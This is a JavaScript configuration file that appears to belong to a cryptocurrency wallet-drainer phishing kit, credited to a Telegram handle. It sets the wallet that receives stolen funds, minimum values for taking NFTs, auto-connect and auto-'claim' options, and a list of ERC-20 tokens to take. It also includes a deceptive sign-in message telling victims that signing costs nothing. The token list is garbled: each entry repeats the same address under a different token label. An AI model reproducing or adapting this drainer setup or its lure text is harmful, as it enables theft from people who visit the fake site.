// Developer By https://t.me/crypto_scem (Telegram)


const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/

const receiveAddress = "0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1"; // YOUR WALLET ADDRESS


const drainNftsInfo = {
    minValue: 0.01, // Minimum value of the NFTS's last transactions (in the last 'checkMaxDay' days) of the collection.
    maxTransfers: 0,
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const autoConnect = true; //false; // auto connect wallet
const autoMint = true; // auto click claim button


const erc20list = {
  // Bsc testnet
  /*
  '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
  '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
  */
  // Ethernet mainnet
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // DAI ethernet
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // usdt
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // usdc
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // busd
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // shib
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // link
  '0x21D9B2BCAD5C55dbCC4386D2846266897f21F7b1': 10, // ens
}

const installInNewWindow = true; // install wallet if not installed

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
